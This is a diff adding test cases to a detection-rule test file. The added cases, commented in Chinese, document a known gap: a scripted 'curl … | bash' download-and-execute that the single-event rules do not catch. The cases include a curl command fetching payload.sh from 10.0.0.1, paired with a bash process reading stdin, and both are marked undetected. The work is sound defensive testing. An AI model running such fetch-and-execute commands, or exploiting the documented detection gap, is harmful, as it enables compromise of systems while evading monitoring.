@@ -125,3 +125,29 @@ cases:
       process:
         name: sh
         cmd_line: "sh -c 'echo hello'"
+
+  # 脚本里的 `curl … | bash`：shell 先 fork 出两个兄弟进程再接管道，两条命令行都不含 `|`，
+  # 单事件规则看不到；时序引擎缺「只作信号不出告警」的基础规则，暂不覆盖（见 temporal-rules/README.md）
+  - name: 脚本内管道下载执行——下载端 curl（已知缺口）
+    source: 实机回放第四轮 validation/replay/linux.sh
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: curl
+        file:
+          path: /usr/bin/curl
+        cmd_line: "curl -s --connect-timeout 3 http://10.0.0.1/payload.sh"
+
+  - name: 脚本内管道下载执行——执行端 bash 读 stdin（已知缺口）
+    source: 实机回放第四轮 validation/replay/linux.sh
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: bash
+        file:
+          path: /usr/bin/bash
+        cmd_line: "bash"
